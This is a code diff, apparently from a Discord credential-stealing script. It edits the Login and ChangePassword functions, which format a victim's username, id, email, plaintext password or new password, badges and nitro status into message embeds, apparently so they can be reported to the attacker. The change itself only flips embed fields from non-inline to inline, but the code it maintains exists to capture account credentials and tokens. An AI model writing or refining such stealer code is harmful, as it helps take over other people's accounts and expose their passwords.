@@ -198,7 +198,7 @@ function Login(email, password, token) {
                         {
                             "name": "name",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
-                            "inline": false
+                            "inline": true
                         },
                         {
                             "name": "id",
@@ -213,7 +213,7 @@ function Login(email, password, token) {
                         {
                             "name": "email",
                             "value": `\`${email}\``,
-                            "inline": false
+                            "inline": true
                         },
                         {
                             "name": "password",
@@ -228,7 +228,7 @@ function Login(email, password, token) {
                         {
                             "name": "badges",
                             "value": `\`${GetBadges(json.flags)}\``,
-                            "inline": false		    
+                            "inline": true		    
                         },
                         {
                             "name": "nitro",
@@ -285,7 +285,7 @@ function ChangePassword(email, newpassword, token) {
                         {
                             "name": "name",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
-                            "inline": false
+                            "inline": true
                         },
                         {
                             "name": "id",
@@ -300,7 +300,7 @@ function ChangePassword(email, newpassword, token) {
                         {
                             "name": "email",
                             "value": `\`${email}\``,
-                            "inline": false
+                            "inline": true
                         },
                         {
                             "name": "new password",
@@ -315,7 +315,7 @@ function ChangePassword(email, newpassword, token) {
                         {
                             "name": "badges",
                             "value": `\`${GetBadges(json.flags)}\``,
-                            "inline": false		    
+                            "inline": true		    
                         },
                         {
                             "name": "nitro",
